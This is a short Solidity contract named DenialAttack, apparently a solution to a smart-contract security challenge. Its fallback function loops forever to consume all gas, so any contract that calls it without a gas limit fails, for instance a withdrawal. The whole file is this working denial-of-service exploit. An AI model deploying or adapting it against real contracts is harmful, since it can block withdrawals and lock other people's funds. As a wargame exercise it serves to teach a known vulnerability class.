// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DenialAttack {

  fallback() external payable {
      // consume all the gas
      while(true) {}
      //TODO // assert(1==2);
  }

}
